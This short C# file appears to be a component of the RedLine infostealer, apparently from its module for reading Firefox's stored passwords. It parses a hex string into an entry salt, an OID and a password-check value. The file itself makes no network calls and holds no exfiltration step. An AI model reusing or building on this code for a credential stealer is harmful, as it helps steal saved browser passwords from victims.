using System.Globalization;

namespace RedLine.Models.Gecko
{
  public class PasswordCheck
  {
    public string EntrySalt { get; }

    public string OID { get; }

    public string Passwordcheck { get; }

    public PasswordCheck(string DataToParse)
    {
      int length1 = int.Parse(DataToParse.Substring(2, 2), NumberStyles.HexNumber) * 2;
      this.EntrySalt = DataToParse.Substring(6, length1);
      int length2 = DataToParse.Length - (6 + length1 + 36);
      this.OID = DataToParse.Substring(6 + length1 + 36, length2);
      this.Passwordcheck = DataToParse.Substring(6 + length1 + 4 + length2);
    }
  }
}
